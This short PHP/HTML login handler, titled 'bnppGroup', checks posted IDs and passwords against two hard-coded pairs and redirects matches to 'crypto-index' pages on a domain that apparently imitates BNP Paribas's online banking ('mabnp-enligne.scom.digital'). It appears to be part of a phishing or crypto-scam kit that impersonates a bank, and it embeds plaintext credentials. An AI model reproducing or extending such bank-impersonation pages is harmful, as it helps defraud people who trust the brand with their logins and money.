
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>bnppGroup</title>
</head>

<body>

<?php 
/*erreur warnning sur les header "Cannot modify header information - headers already sent by" : mettre le codephp avant toute fonction */
$id=$_POST['leuser'];
$pass=$_POST['lepas'];


	if ($id =='4029209' and $pass=='455783')
	{
		
		
		header ('Location: https://mabnp-enligne.scom.digital/DSF/solutions/lapliste/LLLeBon/finapp.bragherstudio.com/view22/crypto-index.html');
		
		
	}
	else if ($id =='8759209' and $pass=='455783')
	{
		
		
		header ('Location: https://mabnp-enligne.scom.digital/DSF/solutions/lapliste/LLLeBon/finapp.bragherstudio.com/view22/crypto-index-2.html');
		
		
	}
	
	
	else{
			
			
			
			header ('Location: y1qError.html');

		}

	
?>

</body>
</html>